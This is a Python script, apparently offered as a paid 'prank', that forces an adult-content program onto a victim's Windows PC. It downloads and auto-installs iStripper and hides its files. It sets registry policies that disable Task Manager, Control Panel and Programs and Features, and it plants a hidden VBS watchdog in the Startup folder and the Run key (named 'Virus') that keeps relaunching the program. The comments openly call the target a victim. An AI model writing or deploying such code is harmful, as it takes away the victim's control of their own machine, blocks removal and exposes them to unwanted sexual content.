from pywinauto.keyboard import send_keys
from pywinauto.application import Application
import os
import time
import winreg
import sys
import requests
import ctypes
import tkinter as tk
from tkinter import messagebox
import subprocess
import shutil

url = 'https://www.istripper.com/fileaccess/software'
filename = 'istripper.exe'
cwd = str(os.getcwd())
login = str(os.getlogin())
dire = f'C:/Users/{login}/AppData/Local/vghd'
di = fr'C:\Users\{login}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
vbs_startup = os.path.join(di, 'script.vbs')
shortcut_name = 'script'
vbs = f'{cwd}/script.vbs'


def is_admin():
    print("Checking root!...")
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def download_software(url, filename):
    print("downloading the software....")
    req = requests.get(url)

    with open(filename, 'wb') as file:
        for chunks in req.iter_content(chunk_size=8192):
            if chunks:
                file.write(chunks)


def install_software(filename):
    print("Please do not disturb anything the installation may interrupt...")
    Application().start(cmd_line=filename)
    time.sleep(3)
    send_keys('{ENTER}')
    time.sleep(3)
    send_keys('{ENTER}')
    time.sleep(3)
    send_keys('{ENTER}')
    time.sleep(20)
    send_keys('{ENTER}')
    time.sleep(9)
    send_keys('{ENTER}')
    time.sleep(5)
    send_keys('{ENTER}')
    time.sleep(2)
    send_keys('%{F4}')
    time.sleep(10)
    send_keys('%{F4}')


def hide_all_vghd_files(dir):
    print("hiding all the istripper files...")
    os.system("attrib +h +s " + dire)
    os.system("attrib +h +s C:/Users/" +
              str(os.getlogin())+"/AppData/Local/Totem")
    for root, dirs, files in os.walk(dir):
        for name in files + dirs:
            if not name.endswith('.dll'):
                file_path = os.path.join(root, name)
                os.system('attrib +h +s "{}"'.format(file_path))


def hide_programs_and_feature():  # not only programs and features we hide, system tray, task manager etc
    print("Hiding control panel and task manager and other things....")
    key = winreg.CreateKeyEx(
        winreg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer")
    winreg.SetValueEx(key, "DisallowCPL", 0, winreg.REG_DWORD, 1)
    winreg.SetValueEx(key, "NoTrayItemsDisplay", 0, winreg.REG_DWORD, 1)
    disallow_cpl_key = winreg.CreateKeyEx(key, "DisallowCPL")
    winreg.SetValueEx(disallow_cpl_key, "Programs and Features",
                      0, winreg.REG_SZ, "Programs and Features")
    winreg.SetValueEx(disallow_cpl_key, None, 0, winreg.REG_DWORD, 1)
    winreg.CloseKey(key)
    winreg.CloseKey(disallow_cpl_key)
    registry_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"
    registry_name = "System"
    value = 1

    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             registry_path, 0, winreg.KEY_ALL_ACCESS)
    sys_key = winreg.CreateKey(reg_key, registry_name)

    winreg.SetValueEx(sys_key, "DisableTaskMgr", 0, winreg.REG_DWORD, value)

    winreg.CloseKey(sys_key)
    winreg.CloseKey(reg_key)


class Run_istripper_continuosly():
    # this was my idea but cant create a seperate exe for this right
    # def check_whether_istripper_running_or_not(self,dir):
    #     while True:
    #         try:
    #             result = subprocess.run(["tasklist"], stdout=subprocess.PIPE)
    #             if "vghd.exe" not in str(result.stdout):
    #                 if os.path.exists(dir):
    #                     subprocess.Popen([dir], shell=True)
    #                 else:
    #                     print("Error: The file 'vghd.exe' could not be found.")
    #         except Exception as e:
    #             print(e)
    #         time.sleep(10)

    # u will ask why the hell ur creating this script i create it bcoz if victim somehow even exit the software this will help run again
    def create_checking_script_for_istripper(self):
        print("Creating a script to run on startup")
        script = r"""Set WshShell = CreateObject("WScript.Shell")
program_path = "C:/Users/" & WshShell.ExpandEnvironmentStrings("%USERNAME%") & "/AppData/Local/vghd/bin/vghd.exe"

Do
    Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'vghd.exe'")

    If colProcessList.Count = 0 Then
        WshShell.Run Chr(34) & program_path & Chr(34), 0, False
    End If

    WScript.Sleep 60 * 1000
Loop"""

        with open('script.vbs', 'w') as sc:
            sc.write(script)
            sc.close()

    def run_script_at_startup_istripper(self, vbs_loc, vbs_startup_loc, dst_loc):
        print("making the software run on startup....")
        shutil.move(vbs_loc, dst_loc)
        subprocess.run(['attrib', '+h', '+s', f'{dst_loc}\\script.vbs'])
        startup_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(startup_key, "Virus", 0, winreg.REG_SZ,
                          f'"wscript.exe" "{vbs_startup_loc}"')
        winreg.CloseKey(startup_key)


if __name__ == "__main__":
    if not is_admin():
        root = tk.Tk()
        root.withdraw()
        messagebox.showerror(
            "Error", "Please run the software as administrator.")
        sys.exit()
    download_software(url=url, filename=filename)
    install_software(filename=filename)
    hide_all_vghd_files(dir=dire)
    hide_programs_and_feature()
    # creating object and calling the methods(functions)
    r = Run_istripper_continuosly()  # .check_whether_istripper_running_or_not(di)
    r.create_checking_script_for_istripper()
    r.run_script_at_startup_istripper(
        vbs_loc=vbs, vbs_startup_loc=vbs_startup, dst_loc=di)
    print("done everything thanks for using the software !!! this is only for prank and there is a premium version in which the girls do full strip tease naked, this software only for 5$ to buy contact me on discord")
